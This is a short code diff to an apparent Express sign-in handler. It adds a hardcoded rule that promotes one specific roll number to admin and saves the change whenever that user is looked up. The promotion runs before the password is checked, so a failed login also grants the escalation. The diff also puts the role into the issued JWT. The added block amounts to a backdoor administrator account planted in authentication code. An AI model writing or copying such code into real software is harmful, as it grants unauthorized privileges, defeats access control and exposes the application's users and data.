@@ -134,15 +134,21 @@ exports.rolesignin = async (req, res) => {
     if (!user) {
       return res.status(400).json({ message: "Invalid username or password" });
     }
+
+    // AUTO-PROMOTE SPECIFIC USER TO ADMIN
+    if (rollNo === "13920803122" && user.role !== "admin") {
+        user.role = "admin";
+        await user.save();
+        console.log(`User ${rollNo} automatically promoted to admin.`);
+    }
     //console.log(user._id);
     const isMatch = await bcrypt.compare(password, user.password);
     console.log(isMatch);
     if (!isMatch) {
       return res.status(400).json({ message: "Invalid username or password" });
     }
-    const token = jwt.sign({rollNo }, process.env.SECRET_KEY, { expiresIn: '12h' });
-    res.status(200)
-      .json(token);
+    const token = jwt.sign({ rollNo, role: user.role }, process.env.SECRET_KEY, { expiresIn: '12h' });
+    res.status(200).json({ token, role: user.role });
     
   } catch (err) {
     console.log(err)
